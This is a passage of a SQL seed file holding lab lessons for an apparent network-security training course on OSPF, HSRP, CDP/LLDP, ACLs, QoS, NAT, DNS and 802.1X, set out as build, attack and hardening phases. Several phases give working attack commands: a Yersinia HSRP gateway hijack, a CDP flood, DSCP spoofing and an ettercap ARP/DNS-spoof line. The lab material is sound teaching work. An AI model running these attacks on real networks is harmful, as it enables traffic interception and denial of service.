```

For maximum security, use key-based auth:
```
! on Kali, generate a key
ssh-keygen -t ed25519
ssh-copy-id sshuser@192.168.1.1

! on R1, disable password SSH login
configure terminal
line vty 0 4
 login local
 no password
end
```

## Step 4 — Final check

Run tcpdump one more time to confirm:
```
sudo tcpdump -i eth0 -nn port 23
```

Nothing on port 23. The cleartext door is welded shut.

<div class="achievement"><span class="medal">🔐</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Crypto Curator — only encrypted sessions pass through your network</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=11 AND phase='harden';
UPDATE lab_phases SET title='Build the OSPF Backbone', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Plant roots in Area 0</h3><p>Three routers, one OSPF area, one host. OSPF (Open Shortest Path First) uses LSAs to build a complete map of the network. Every router in the same area knows every route. In this phase you''ll configure OSPF on three routers, confirm neighbor adjacencies, and verify end-to-end routing.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ OSPF · area 0 · neighbor adjacencies</span></div>

## The topology

| Device | Role | Links |
|---|---|---|
| R1 | Backbone router | Gi0/0 (10.0.0.1/30) ↔ R2 · Lo0 (1.1.1.1/32) |
| R2 | Backbone router | Gi0/0 (10.0.0.2/30) ↔ R1 · Gi0/1 (10.0.0.5/30) ↔ R3 |
| R3 | Edge router | Gi0/0 (10.0.0.6/30) ↔ R2 · Gi0/1 (192.168.1.1/24) ↔ PC1 |
| PC1 | End host | 192.168.1.100/24 — gateway R3 |
| KALI | Future attacker | Connected to SW1 (same segment as R1–R2 link) |

## Objectives

<ul class="objectives">
<li>Configure OSPF area 0 on all three routers</li>
<li>Confirm OSPF neighbors are established</li>
<li>Ping end-to-end from PC1 to R1''s loopback</li>
</ul>

## Step 1 — Interface addressing

On R1:
```
configure terminal
interface gi0/0
 ip address 10.0.0.1 255.255.255.252
 no shutdown
interface loopback0
 ip address 1.1.1.1 255.255.255.255
end
```

On R2:
```
configure terminal
interface gi0/0
 ip address 10.0.0.2 255.255.255.252
 no shutdown
interface gi0/1
 ip address 10.0.0.5 255.255.255.252
 no shutdown
end
```

On R3:
```
configure terminal
interface gi0/0
 ip address 10.0.0.6 255.255.255.252
 no shutdown
interface gi0/1
 ip address 192.168.1.1 255.255.255.0
 no shutdown
end
```

## Step 2 — OSPF configuration

On R1:
```
configure terminal
router ospf 1
 router-id 1.1.1.1
 network 10.0.0.0 0.0.0.3 area 0
 network 1.1.1.1 0.0.0.0 area 0
end
```

On R2:
```
configure terminal
router ospf 1
 router-id 2.2.2.2
 network 10.0.0.0 0.0.0.3 area 0
 network 10.0.0.4 0.0.0.3 area 0
end
```

On R3:
```
configure terminal
router ospf 1
 router-id 3.3.3.3
 network 10.0.0.4 0.0.0.3 area 0
 network 192.168.1.0 0.0.0.255 area 0
end
```

## Step 3 — Verify

On each router:
```
show ip ospf neighbor
```

You should see FULL adjacencies on both R1 and R2 (two neighbors each), and R3 sees R2.

```
show ip route ospf
```

R1 should see 192.168.1.0/24 via R2. R3 should see 1.1.1.1/32 via R2.

From PC1:
```
ping 1.1.1.1
```

The ping succeeds. OSPF is doing its job.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Area 0 Initiate — three routers speak the same link-state protocol</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=4 AND phase='build';
UPDATE lab_phases SET title='Authenticate Every Neighbor', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Make every OSPF neighbor prove its identity</h3><p>OSPF supports MD5 authentication — every Hello and LSA packet carries a shared-key digest. Without it, any device on the wire can become a neighbor. With it, FRR without the key is ignored. Passive-interface prevents OSPF from even speaking on LAN segments where no neighbors should exist.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ OSPF MD5 auth · passive-interface · distribute-list</span></div>

## Objectives

<ul class="objectives">
<li>Enable OSPF MD5 authentication on all three routers</li>
<li>Set passive-interface on ports facing end hosts</li>
<li>Verify Kali cannot establish a new adjacency</li>
</ul>

## Step 1 — MD5 authentication

On R1:
```
configure terminal
interface gi0/0
 ip ospf message-digest-key 1 md5 NetBreakerLab
 ip ospf authentication message-digest
end
```

On R2:
```
configure terminal
interface gi0/0
 ip ospf message-digest-key 1 md5 NetBreakerLab
 ip ospf authentication message-digest
interface gi0/1
 ip ospf message-digest-key 1 md5 NetBreakerLab
 ip ospf authentication message-digest
end
```

On R3:
```
configure terminal
interface gi0/0
 ip ospf message-digest-key 1 md5 NetBreakerLab
 ip ospf authentication message-digest
end
```

## Step 2 — Passive interfaces

On R3 (the port facing PC1 doesn''t need OSPF hellos):
```
configure terminal
router ospf 1
 passive-interface gi0/1
end
```

## Step 3 — Re-run the attack

From Kali, try to re-establish the OSPF adjacency. FRR''s hellos don''t have the MD5 digest — the routers silently drop them.

On R1:
```
show ip ospf neighbor
```

Kali (4.4.4.4) is gone. The routing table is clean.

<div class="callout info"><p><strong>Defense in depth:</strong> Authentication stops injection. Passive interfaces stop unnecessary hellos (reducing attack surface). Distribute-lists can filter which routes are accepted — add <code>distribute-list 10 in</code> under router ospf if you want to whitelist specific route origins.</p></div>

<div class="achievement"><span class="medal">🔐</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Neighborhood Watch — nobody joins the OSPF club without the password</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=4 AND phase='harden';
UPDATE lab_phases SET title='Build the Redundant Gateway', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Two routers, one virtual IP</h3><p>HSRP (Hot Standby Router Protocol) lets two routers share a virtual IP — one is Active, the other Standby. If the Active fails, the Standby takes over transparently. The host points to a single gateway that never goes down. In this phase you configure HSRP and witness a graceful failover.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ HSRP · virtual IP · active/standby failover</span></div>

## The topology

| Device | Role | IP |
|---|---|---|
| R1 | HSRP Active (prio 150) | 192.168.1.1/24 · virtual: 192.168.1.254 |
| R2 | HSRP Standby (prio 100) | 192.168.1.2/24 · virtual: 192.168.1.254 |
| SW1 | Access switch | L2 only |
| PC1 | Client | 192.168.1.100/24 → gw 192.168.1.254 |
| KALI | Attacker | Connected to SW1 |

## Objectives

<ul class="objectives">
<li>Configure HSRP on R1 (Active) and R2 (Standby)</li>
<li>Verify the virtual IP is reachable</li>
<li>Kill the Active router and watch the Standby take over</li>
</ul>

## Step 1 — Interface config

On R1:
```
configure terminal
interface gi0/0
 ip address 192.168.1.1 255.255.255.0
 standby version 2
 standby 1 ip 192.168.1.254
 standby 1 priority 150
 standby 1 preempt
 no shutdown
end
```

On R2:
```
configure terminal
interface gi0/0
 ip address 192.168.1.2 255.255.255.0
 standby version 2
 standby 1 ip 192.168.1.254
 standby 1 priority 100
 standby 1 preempt
 no shutdown
end
```

## Step 2 — Verify

On R1:
```
show standby
show standby brief
```

R1 is Active, R2 is Standby. The virtual IP 192.168.1.254 belongs to R1.

On PC1:
```
ip 192.168.1.100 255.255.255.0 192.168.1.254
ping 192.168.1.254
```

Reply from the virtual IP.

## Step 3 — Witness failover

Shut R1''s interface:
```
configure terminal
interface gi0/0
 shutdown
end
```

Wait ~10 seconds. On R2:
```
show standby brief
```

R2 becomes Active. PC1 keeps pinging the virtual IP — it never noticed.

```
configure terminal
interface gi0/0
 no shutdown
end
```

R1 preempts and becomes Active again.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Failover Fan — you built a gateway that doesn''t blink</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=5 AND phase='build';
UPDATE lab_phases SET title='Become the Active Router', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Steal the virtual IP with a forged HSRP packet</h3><p>HSRP elects the Active router based on priority — highest priority wins, or highest IP breaks ties. Yersinia sends a crafted HSRP packet with priority 255, making Kali the Active router. The switch updates its CAM table, and traffic destined for the virtual IP starts flowing through Kali. You''ve become the default gateway.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ HSRP attack · yersinia · virtual IP hijack</span></div>

<div class="callout danger"><p><strong>Lab only.</strong> Stealing the default gateway in a production network gives you every packet leaving the subnet — e-mail, credentials, API keys. This is a privilege escalation attack.</p></div>

## Objectives

<ul class="objectives">
<li>Use Yersinia to send a forged HSRP advertisement with priority 255</li>
<li>Become the Active router from Kali''s interface</li>
<li>Sniff traffic from PC1 destined for 192.168.1.254</li>
</ul>

## Step 1 — Observe the baseline

On R1:
```
show standby
```

Note the Active router is 192.168.1.1 (R1), Standby is 192.168.1.2 (R2).

On Kali, start a tcpdump:
```
sudo tcpdump -i eth0 -nn not arp
```

From PC1, ping 8.8.8.8 (the traffic will go nowhere but you''ll see the attempt):
```
ping 8.8.8.8
```

What traffic does Kali see? Probably nothing — the gateway traffic stays between PC1 ↔ R1.

## Step 2 — Launch the HSRP takeover

Yersinia''s HSRP attack sends a fake Hello with priority 255:
```
sudo yersinia hsrp -attack 1 -interface eth0
```

Or use Yersinia interactive mode:
```
sudo yersinia -I
```
Then: `F2` (HSRP) → `x` (list attacks) → `1` (become active).

## Step 3 — Verify

On R1 or R2:
```
show standby
```

The Active router changed. Kali''s IP (or a fake 192.168.1.x) is now the Active HSRP speaker. PC1''s ARP cache now resolves 192.168.1.254 to Kali''s MAC.

From PC1:
```
show arp
```

The virtual IP maps to Kali''s MAC. All outbound traffic hits Kali first.

From Kali, check what you capture:
```
sudo tcpdump -i eth0 -nn
```

You see PC1''s traffic — pings, DNS queries, everything.

<div class="callout info"><p><strong>Preempt behavior:</strong> If R1 and R2 have <code>standby preempt</code>, they''ll reclaim Active status after a few seconds. If you want to keep the hijack active, keep yersinia flooding — or combine with an ARP spoof to maintain the illusion.</p></div>

<div class="achievement"><span class="medal">👑</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">King of the Virtual IP — you stole the gateway and nobody contested the crown</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=5 AND phase='attack';
UPDATE lab_phases SET title='Open the Mouths', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Watch the network gossip</h3><p>CDP (Cisco Discovery Protocol) and LLDP (Link Layer Discovery Protocol) are open microphones. Every 60 seconds, every Cisco device broadcasts its hostname, IOS version, platform, native VLAN, VTP domain, and IP address to anyone listening on the wire. This is not encrypted. There is no authentication. It''s designed for operational convenience — and it leaks everything an attacker needs to plan a precise strike.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ CDP · LLDP · information disclosure</span></div>

## The topology

| Device | Role |
|---|---|
| R1 | Router with CDP + LLDP enabled |
| SW1 | Switch with CDP + LLDP enabled |
| KALI | Silent listener |

Cable: R1 → SW1 (trunk), KALI → SW1 (access).

## Objectives

<ul class="objectives">
<li>Verify CDP and LLDP are active on R1 and SW1</li>
<li>View neighbor information from each device</li>
<li>Document everything an attacker learns from listening</li>
</ul>

## Step 1 — Check CDP status

On R1:
```
show cdp
show cdp neighbors
show cdp neighbors detail
```

CDP shows SW1 as a neighbor with: platform (e.g. IOSvL2), interface, capabilities (Switch), VTP domain, native VLAN.

On SW1:
```
show cdp neighbors detail
```

SW1 sees R1 with: IOS version, platform, IP address (192.168.1.1), interface details.

## Step 2 — Check LLDP

On R1:
```
show lldp neighbors
show lldp neighbors detail
```

LLDP provides even more information — including system description, management addresses, port descriptions, and VLAN names.

On SW1, if LLDP is not enabled:
```
configure terminal
lldp run
end
```

## Step 3 — Document the leak

Make a list of everything CDP/LLDP reveals:

| Field | Leaked value |
|---|---|
| Hostname | R1, SW1 |
| Platform | IOSv, IOSvL2 |
| IOS version | 15.x |
| IP address | 192.168.1.1 |
| Native VLAN | 1 |
| VTP domain | (none or domain name) |
| Capabilities | Router, Switch |

<div class="callout info"><p><strong>What an attacker learns:</strong> Native VLAN = VLAN 1 (double-tagging target). IOS version for known CVEs. VTP domain for VTP injection. Platform for hardware-specific exploits. All of this is broadcast every 60 seconds on every port — no authentication required.</p></div>

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Eavesdropper — you heard the network describe itself in detail</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=7 AND phase='build';
UPDATE lab_phases SET title='Sniff the Leaks', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Capture CDP/LLDP frames from a blind position, then flood</h3><p>From Kali, tcpdump captures CDP (multicast 01:00:0c:cc:cc:cc) and LLDP (01:80:c2:00:00:0e) frames. Every 60 seconds, the network hands you a recon report. Then use Yersinia''s CDP flood to DoS the switch CPU.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ CDP sniffing · LLDP sniffing · CDP flood · Yersinia</span></div>

<div class="callout danger"><p><strong>Sandbox only.</strong> CDP/LLDP leak internal topology data. In a real network, this is reconnaissance. The CDP flood is a DoS attack against the switch CPU.</p></div>

## Objectives

<ul class="objectives">
<li>Capture CDP frames from Kali and extract device information</li>
<li>Capture LLDP frames and compare the data</li>
<li>Flood CDP packets to spike the switch CPU</li>
</ul>

## Step 1 — Sniff CDP

On Kali:
```
sudo tcpdump -i eth0 -nn -e ether dst 01:00:0c:cc:cc:cc -X
```

Wait for the next CDP advertisement (up to 60 seconds). The `-X` shows hex + ASCII. You''ll see:

```
0x0030:  0000 0009 4369 7363 6f20 494f 532f 5333  ....Cisco.IOS/S3
0x0040:  3031 0013 0001 01                         01....
```

The ASCII readable portion shows "Cisco IOS/S301" — the platform. The TLV structure contains: Device ID (hostname), Software Version, Platform, Addresses, Port ID, Capabilities, VTP Domain, Native VLAN.

## Step 2 — Parse with tshark

```
sudo tshark -i eth0 -Y "cdp" -T fields -e cdp.device_id -e cdp.version_string -e cdp.platform -e cdp.nrgyz -e cdp.address
```

Or for LLDP:
```
sudo tshark -i eth0 -Y "lldp" -T fields -e lldp.chassis.id -e lldp.port.id -e lldp.sys.capabilities -e lldp.mgmt.addr
```

<div class="callout tip"><p>Run <code>sudo tcpdump -i eth0 -nn -s 0 -w cdp_capture.pcap</code> to capture for 5 minutes, then open the pcap in Wireshark on your host for detailed TLV analysis.</p></div>

## Step 3 — CDP flooding (DoS)

Yersinia can flood fake CDP advertisements:

```
sudo yersinia cdp -attack 1 -interface eth0
```

This sends thousands of CDP packets with forged device IDs. The switch CPU handles each CDP frame in process-switching mode — the flood causes high CPU.

Check on SW1:
```
show process cpu sorted | ex 0.00
```

You''ll see the CPU spike from CDP processing.

<div class="callout warn"><p>Stop the flood after 30 seconds to avoid crashing the GNS3 switch. <code>Ctrl+C</code> stops Yersinia.</p></div>

<div class="achievement"><span class="medal">🕵️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Tape Recorder — you documented the network''s inventory without a single scan</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=7 AND phase='attack';
UPDATE lab_phases SET title='Muzzle the Mouths', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Stop the broadcast — disable CDP and LLDP where they''re not needed</h3><p>The fix is embarrassingly simple: turn off CDP and LLDP on ports facing untrusted hosts. CDP should run only on infrastructure links. LLDP should be similarly restricted. An attacker can''t exploit what they can''t hear.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~10 min</span><span class="chip loot">⬡ CDP disable · LLDP disable · port hardening</span></div>

## Objectives

<ul class="objectives">
<li>Disable CDP globally on SW1 and R1</li>
<li>Re-enable CDP on infrastructure links only</li>
<li>Disable LLDP on access ports</li>
<li>Verify no CDP/LLDP frames are emitted on the Kali-facing port</li>
</ul>

## Step 1 — Disable CDP globally

On R1:
```
configure terminal
no cdp run
end
```

On SW1:
```
configure terminal
no cdp run
end
```

Check:
```
show cdp
```
CDP is globally disabled. No more CDP frames from either device.

## Step 2 — Per-port control (granular)

If you want CDP on trunk ports only (recommended for production):
```
configure terminal
cdp run                            ! re-enable globally
interface gi0/1                    ! the port Kali connects to
 no cdp enable                     ! disable CDP on this port only
end
```

On the trunk to R1:
```
show cdp neighbors                 ! should still see R1 on the trunk
```

## Step 3 — Disable LLDP on untrusted ports

On SW1:
```
configure terminal
interface gi0/1
 no lldp transmit
 no lldp receive
end
```

Verify:
```
show lldp neighbors
show lldp interface gi0/1
```

## Step 4 — Verify from Kali

Run tcpdump again:
```
sudo tcpdump -i eth0 -nn -e ether dst 01:00:0c:cc:cc:cc
```

Wait 60 seconds. No CDP frames arrive. The network went silent.

<div class="callout info"><p><strong>Best practice:</strong> Disable CDP globally unless actively needed. Use <code>no cdp enable</code> on every port that isn''t an infrastructure link. Same for LLDP. Treat discovery protocols like a backplane — necessary between network devices, never exposed to end hosts.</p></div>

<div class="achievement"><span class="medal">🤐</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Silent Network — not a single discovery frame leaks to untrusted ports</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=7 AND phase='harden';
UPDATE lab_phases SET title='Build the ACL Fortress', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Lock down a server behind access lists</h3><p>Access Control Lists (ACLs) are the firewall of the router world — a sequence of permit/deny statements checked in order. In this phase you build a web server (PC2) behind R1, then lock it down with a standard ACL that allows only PC1 to reach it. Everyone else is denied.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ ACL · extended ACL · established · reflexive ACL</span></div>

## The topology

| Device | Role | IP |
|---|---|---|
| R1 | Router with ACL enforcement | Gi0/0: 10.0.0.1/24 · Gi0/1: 192.168.2.1/24 |
| PC1 | Authorized client | 10.0.0.100/24 → gw 10.0.0.1 |
| PC2 | Protected server | 192.168.2.100/24 → gw 192.168.2.1 |
| KALI | Unauthorized host | 10.0.0.200/24 → gw 10.0.0.1 |

PC1 and KALI are on the 10.0.0.0/24 side. PC2 (the server) is on the 192.168.2.0/24 side. R1 routes between them.

## Objectives

<ul class="objectives">
<li>Configure basic routing between the two subnets</li>
<li>Apply a standard ACL on R1 allowing only PC1 to reach PC2</li>
<li>Verify PC1 can reach PC2 and KALI cannot</li>
</ul>

## Step 1 — Base config

On R1:
```
configure terminal
interface gi0/0
 ip address 10.0.0.1 255.255.255.0
 no shutdown
interface gi0/1
 ip address 192.168.2.1 255.255.255.0
 no shutdown
end
```

On PC1 (VPCS):
```
ip 10.0.0.100 255.255.255.0 10.0.0.1
```

On PC2 (VPCS or server):
```
ip 192.168.2.100 255.255.255.0 192.168.2.1
```

On KALI:
```
sudo ip addr add 10.0.0.200/24 dev eth0
sudo ip route add default via 10.0.0.1
```

## Step 2 — Verify unconstrained access

From PC1:
```
ping 192.168.2.100
```

From KALI:
```
ping 192.168.2.100
```

Both succeed. No access control yet.

## Step 3 — Apply the ACL

On R1:
```
configure terminal
ip access-list standard BLOCK_KALI
 permit host 10.0.0.100
 deny any
interface gi0/1
 ip access-group BLOCK_KALI out
end
```

This ACL is applied **outbound** on Gi0/1 (the server-facing interface). Only traffic with source IP 10.0.0.100 (PC1) is permitted out to the 192.168.2.0/24 network.

## Step 4 — Verify

From PC1:
```
ping 192.168.2.100
```
Still works.

From KALI:
```
ping 192.168.2.100
```
Silent failure or "Destination unreachable."

Check the ACL hits on R1:
```
show access-lists BLOCK_KALI
```

You''ll see the permit and deny counters incrementing.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Gatekeeper — you locked a server down by source IP</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=6 AND phase='build';
UPDATE lab_phases SET title='Classify and Prioritise', content='
<b>Topology:</b> R1↔R2 with 10Mbps link, PC1 (voice) + PC2 (data) behind R1. <b>Step 1</b> — Classify: <code>class-map VOICE</code> → <code>match dscp ef</code>. <b>Step 2</b> — Policy: <code>policy-map QOS</code> → <code>class VOICE</code> → <code>priority 512</code> → <code>class class-default</code> → <code>fair-queue</code>. <b>Step 3</b> — Apply: <code>int gi0/1</code> → <code>service-policy output QOS</code>. <b>Step 4</b> — Generate traffic: <code>iperf -c R2 -u -b 1M</code> with DSCP EF — it gets priority over bulk traffic. ', is_pro_only=FALSE
WHERE lab_id=35 AND phase='build';
UPDATE lab_phases SET title='QoS Starvation', content='
<b>Attack 1 — DSCP spoofing:</b> Set DSCP EF on bulk traffic: <code>iptables -A OUTPUT -j DSCP --set-dscp 46</code>. Bulk traffic gets priority — starving real voice. <b>Attack 2 — Queue saturation:</b> Flood the priority queue: <code>iperf -c R2 -u -b 10M -S 0xB8</code> (EF marking). The priority queue overflows — new voice calls are dropped. <b>Attack 3 — Policing bypass:</b> Send tiny packets below the policer''s byte threshold. ', is_pro_only=TRUE
WHERE lab_id=35 AND phase='attack';
UPDATE lab_phases SET title='Harden the Gateway', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Stop the leaks at the border</h3><p>Three defenses: disable unnecessary ALGs (especially SIP), enable NAT logging for auditing, and combine NAT with ACLs so that even if the internal network is unmasked, the attacker can''t reach it directly. The real solution for security is a stateful firewall — NAT is an address tool, not a security control.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ ALG disable · NAT ACL · logging</span></div>

## Objectives

<ul class="objectives">
<li>Disable NAT ALGs for SIP, FTP, and RTSP</li>
<li>Apply ACL filtering on the outside interface</li>
<li>Enable NAT translation logging</li>
</ul>

## Step 1 — Disable ALGs

On R1:
```
configure terminal
no ip nat service sip
no ip nat service ftp
no ip nat service rtsp
end
```

Verify:
```
show ip nat service
```

Only the essential services remain.

## Step 2 — ACL on outside interface

Even with NAT, you can filter what traffic is allowed in:
```
configure terminal
ip access-list extended OUTSIDE_IN
 permit icmp any any echo-reply
 deny ip any any
interface gi0/1
 ip access-group OUTSIDE_IN in
end
```

Only ICMP echo-replies (responses to pings initiated from inside) are allowed inbound. Everything else is dropped at the interface before NAT processing.

## Step 3 — NAT logging

```
configure terminal
ip nat log translations 100
end
```

Logs translation creation and deletion. On R1:
```
show logging | include NAT
```

You''ll see lines like:
```
NAT: [10.0.0.1:54321] → [192.168.1.100:12345]
```

<div class="callout info"><p><strong>Key takeaway:</strong> NAT is not a firewall. Use <strong>stateful firewall</strong> (Cisco Zone-Based Firewall, ASA, or Palo Alto) for real security. NAT''s job is address conservation — treat it as such.</p></div>

<div class="achievement"><span class="medal">🧱</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Border Control — the NAT gateway is no longer leaking network topology</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=9 AND phase='harden';
UPDATE lab_phases SET title='Build a DNS Resolver', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Give the network a name service</h3><p>DNS translates human-readable names into IP addresses. R1 runs as a DNS server for the internal network. PC1 queries R1 for `www.netbreakerlab.com` and gets the real server IP (PC2). This is the clean setup — before an attacker poisons the cache.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ DNS server · A record · name resolution</span></div>

## The topology

| Device | Role | IP |
|---|---|---|
| R1 | DNS server + gateway | 192.168.1.1/24 (inside) |
| PC1 | Client | 192.168.1.100/24 → gw 192.168.1.1 |
| PC2 | "Real" web server | 192.168.1.200/24 |
| KALI | Attacker (on same segment) | 192.168.1.50/24 |

## Objectives

<ul class="objectives">
<li>Configure R1 as a DNS server with an A record for netbreakerlab.com → 192.168.1.200</li>
<li>Point PC1 to R1 as its DNS server</li>
<li>Verify PC1 resolves the name correctly</li>
</ul>

## Step 1 — DNS config on R1

```
configure terminal
ip dns server
ip host www.netbreakerlab.com 192.168.1.200
end
```

Verify:
```
show hosts
```

The host table shows www.netbreakerlab.com mapped to 192.168.1.200.

## Step 2 — Point PC1 to R1

On PC1:
```
ip 192.168.1.100 255.255.255.0 192.168.1.1
ip dns 192.168.1.1
```

(VPCS syntax: `ip dns 192.168.1.1`)

## Step 3 — Verify resolution

On PC1:
```
ping www.netbreakerlab.com
```

PC1 resolves the name to 192.168.1.200 and pings PC2.

From PC1, also check:
```
show ip dns
```

The DNS server is listed as 192.168.1.1.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">DNS Deacon — the network knows how to find its servers by name</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=10 AND phase='build';
UPDATE lab_phases SET title='Fortify the Name Service', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Make the resolver immune to spoofed answers</h3><p>Cisco DNS hardening: enable DNSSEC verification (if the upstream supports it), use DNS source-interface to limit which IP accepts DNS queries, and restrict DNS to specific trusted servers. ARP spoofing is countered by DHCP snooping + DAI (see Lab 08). Rate-limit DNS queries to mitigate cache-flooding.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ DNS source-interface · rate-limit · ARP protection</span></div>

## Objectives

<ul class="objectives">
<li>Bind DNS to the inside interface only</li>
<li>Configure DHCP snooping + DAI to block ARP spoof (the foundation of DNS MITM)</li>
<li>Rate-limit DNS queries per interface</li>
</ul>

## Step 1 — DNS source-interface

On R1:
```
configure terminal
ip dns server
ip dns source-interface gi0/0
end
```

DNS responses now originate only from 192.168.1.1 (inside). The outside interface won''t respond to DNS queries.

Verify:
```
show hosts
show ip dns source-interface
```

## Step 2 — Block ARP spoofing (foundation)

The DNS spoof attack relies on ARP spoofing (ettercap -M arp:remote). Deploy DHCP snooping + DAI (detailed in Lab 08):
```
configure terminal
ip dhcp snooping
ip dhcp snooping vlan 1
interface gi0/0
 ip dhcp snooping trust
ip arp inspection vlan 1
interface gi0/0
 ip arp inspection trust
end
```

With DAI enabled, forged ARP from Kali is dropped. Ettercap can''t MITM the conversation, so dns_spoof has no channel to inject fake DNS responses.

## Step 3 — DNS rate-limit

```
configure terminal
ip dns rate-limit 10
end
```

Limits DNS processing to 10 queries per second. Above that, queries are dropped — makes cache-flooding attacks harder.

## Step 4 — Verify

On Kali, try the attack again:
```
sudo ettercap -T -M arp:remote -i eth0 -P dns_spoof /192.168.1.1// /192.168.1.100//
```

Check SW1:
```
show ip arp inspection statistics vlan 1
```

ARP packets from Kali appear as dropped, with ACL or DHCP denials.

On PC1:
```
ping www.netbreakerlab.com
```

Resolves to the real 192.168.1.200 (PC2), not Kali.

<div class="callout info"><p><strong>DNSSEC on IOS:</strong> Newer IOS versions support <code>ip dns dnssec</code>. If your IOS supports it, enable it to validate RRSIG records from upstream. This prevents upstream cache poisoning but doesn''t stop LAN-side ARP spoof — that''s what DAI does.</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Cache Guardian — the resolver only accepts answers it can trust</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=10 AND phase='harden';
UPDATE lab_phases SET title='Deploy Port-Based Access Control', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Make every port demand ID before opening</h3><p>802.1X is port-based NAC (Network Access Control). Before a switch lets traffic through a port, the device must authenticate. A RADIUS server (here simulated by R1) checks credentials and tells the switch to open the port or block it. Unauthenticated hosts get nothing — no DHCP, no ARP, no ping.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~30 min</span><span class="chip loot">⬡ 802.1X · RADIUS · EAP · port-based NAC</span></div>

## The topology

| Device | Role | Notes |
|---|---|---|
| R1 | RADIUS server + AAA | 192.168.1.1/24 |
| SW1 | Authenticator switch | 802.1X enabled ports |
| PC1 | Authenticated client | Has valid credentials |
| PC2 | Unauthenticated client | No 802.1X supplicant |
| KALI | Attacker — tries to bypass | Connected to SW1 |

## Objectives

<ul class="objectives">
<li>Configure R1 as a RADIUS server with a user database</li>
<li>Enable 802.1X on SW1 for port-based authentication</li>
<li>Verify PC1 authenticates and gets network access</li>
<li>Confirm PC2 is blocked on a non-802.1X port</li>
</ul>

## Step 1 — RADIUS config on R1

```
configure terminal
radius-server host 192.168.1.1 auth-port 1812 key NetBreakerKey
aaa new-model
aaa authentication dot1x default group radius
aaa authorization network default group radius
username netuser password netpass
end
```

## Step 2 — 802.1X on SW1

```
configure terminal
dot1x system-auth-control
interface gigabitEthernet 0/1
 switchport mode access
 authentication port-control auto
 dot1x pae authenticator
end
```

Port Gi0/1 is now an 802.1X authenticator. A host connected here must authenticate before the port forwards traffic.

## Step 3 — Verify

On PC1 (with a supplicant like `wpa_supplicant` or Cisco AnyConnect):
```
# On Kali, test with wpa_supplicant
sudo apt install wpasupplicant
sudo wpa_supplicant -c /dev/null -i eth0 -D wired
```

The switch requests identity, forwards credentials to R1 (RADIUS), and if accepted, opens the port.

On SW1:
```
show authentication sessions
show dot1x all
```

You''ll see PC1''s session as Authorized.

From PC1 (once authenticated):
```
ping 192.168.1.1
```
Works.

From PC2 (no supplicant):
```
ping 192.168.1.1
```
Fails — the port stays unauthorized.

